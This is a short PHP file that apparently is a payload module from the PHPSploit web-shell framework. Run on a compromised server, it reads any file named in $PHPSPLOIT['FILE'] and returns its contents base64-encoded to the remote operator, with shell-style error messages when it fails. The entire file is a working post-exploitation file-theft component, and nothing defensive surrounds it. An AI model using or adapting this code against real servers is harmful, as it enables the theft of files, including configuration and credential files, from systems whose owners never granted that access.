<?php

if (@file_exists($PHPSPLOIT['FILE']))
{
    if ((@fileperms($PHPSPLOIT['FILE']) & 0x8000) == 0x8000)
    {
        if ($h = @fopen($PHPSPLOIT['FILE'], 'r'))
        {
            $size = @filesize($PHPSPLOIT['FILE']);
            if ($size == '0')
                return '';
            else
            {
                if ($data = fread($h, $size))
                    return base64_encode($data);
                else
                    return error("%s: Permission denied", $PHPSPLOIT['FILE']);
            }
            fclose($h);
        }
        else
            return error("%s: Permission denied", $PHPSPLOIT['FILE']);
    }
    else
        return error("%s: Not a file", $PHPSPLOIT['FILE']);
}
else
    return error("%s: No such file or directory", $PHPSPLOIT['FILE']);

?>
